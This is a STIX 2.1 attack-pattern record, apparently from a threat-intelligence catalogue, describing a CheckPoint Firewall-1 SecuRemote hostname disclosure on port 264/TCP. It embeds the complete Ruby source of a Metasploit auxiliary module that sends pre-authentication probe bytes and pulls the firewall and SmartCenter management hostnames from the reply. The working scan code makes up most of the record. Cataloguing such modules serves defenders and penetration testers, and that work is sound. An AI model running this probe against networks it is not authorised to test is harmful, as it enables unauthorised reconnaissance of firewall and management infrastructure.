{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7a6927fe-256e-4e8e-8d99-ff45a00e4217",
    "created": "2024-08-14T16:32:08.38431Z",
    "modified": "2024-08-14T16:32:08.384314Z",
    "name": "CheckPoint Firewall-1 SecuRemote Topology Service Hostname Disclosure",
    "description": " This module sends a query to the port 264/TCP on CheckPoint Firewall-1 firewalls to obtain the firewall name and management station (such as SmartCenter) name via a pre-authentication request. The string returned is the CheckPoint Internal CA CN for SmartCenter and the firewall host. Whilst considered \"public\" information, the majority of installations use detailed hostnames which may aid an attacker in focusing on compromising the SmartCenter host, or useful for government, intelligence and military networks where the hostname reveals the physical location and rack number of the device, which may be unintentionally published to the world. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/checkpoint_hostname.rb",
            "external_id": "checkpoint_hostname.rb"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20120508142715/http://www.osisecurity.com.au/advisories/checkpoint-firewall-securemote-hostname-information-disclosure"
        },
        {
            "source_name": "reference",
            "url": "https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk69360"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CheckPoint Firewall-1 SecuRemote Topology Service Hostname Disclosure',\n      'Description'    => %q{\n        This module sends a query to the port 264/TCP on CheckPoint Firewall-1\n        firewalls to obtain the firewall name and management station\n        (such as SmartCenter) name via a pre-authentication request. The string\n        returned is the CheckPoint Internal CA CN for SmartCenter and the firewall\n        host. Whilst considered \"public\" information, the majority of installations\n        use detailed hostnames which may aid an attacker in focusing on compromising\n        the SmartCenter host, or useful for government, intelligence and military\n        networks where the hostname reveals the physical location and rack number\n        of the device, which may be unintentionally published to the world.\n      },\n      'Author'         => [ 'aushack' ],\n      'DisclosureDate' => '2011-12-14', # Looks like this module is first real reference\n      'References'     =>\n        [\n          # aushack - None? Stumbled across, probably an old bug/feature but unsure.\n          [ 'URL', 'https://web.archive.org/web/20120508142715/http://www.osisecurity.com.au/advisories/checkpoint-firewall-securemote-hostname-information-disclosure' ],\n          [ 'URL', 'https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk69360' ]\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(264),\n      ])\n  end\n\n  def autofilter\n    false\n  end\n\n  def run\n    print_status(\"Attempting to contact Checkpoint FW1 SecuRemote Topology service...\")\n    fw_hostname = nil\n    sc_hostname = nil\n\n    connect\n\n    sock.put(\"\\x51\\x00\\x00\\x00\")\n    sock.put(\"\\x00\\x00\\x00\\x21\")\n    res = sock.get_once(4)\n    if (res and res == \"Y\\x00\\x00\\x00\")\n      print_good(\"Appears to be a CheckPoint Firewall...\")\n      sock.put(\"\\x00\\x00\\x00\\x0bsecuremote\\x00\")\n      res = sock.get_once\n      if (res and res =~ /CN=(.+),O=(.+)\\./i)\n        fw_hostname = $1\n        sc_hostname = $2\n        print_good(\"Firewall Host: #{fw_hostname}\")\n        print_good(\"SmartCenter Host: #{sc_hostname}\")\n      end\n    else\n      print_error(\"Unexpected response: '#{res.inspect}'\")\n    end\n\n    report_info(fw_hostname,sc_hostname)\n\n    disconnect\n  end\n\n  # Only trust that it's real if we have a hostname. If you get a funny\n  # response, it might not be what we think it is.\n  def report_info(fw_hostname,sc_hostname)\n    return unless fw_hostname\n    host_info = {\n      :host => datastore['RHOST'],\n      :os_name => \"Checkpoint Firewall-1\",\n      :purpose => \"firewall\"\n    }\n    host_info[:name] = fw_hostname\n    host_info[:info] = \"SmartCenter Host: #{sc_hostname}\" if sc_hostname\n    report_host(host_info)\n    svc_info = {\n      :host => datastore['RHOST'],\n      :port => datastore['RPORT'],\n      :proto => \"tcp\",\n      :name => \"securemote\"\n    }\n    report_service(svc_info)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-14, # Looks like this module is first real reference"
}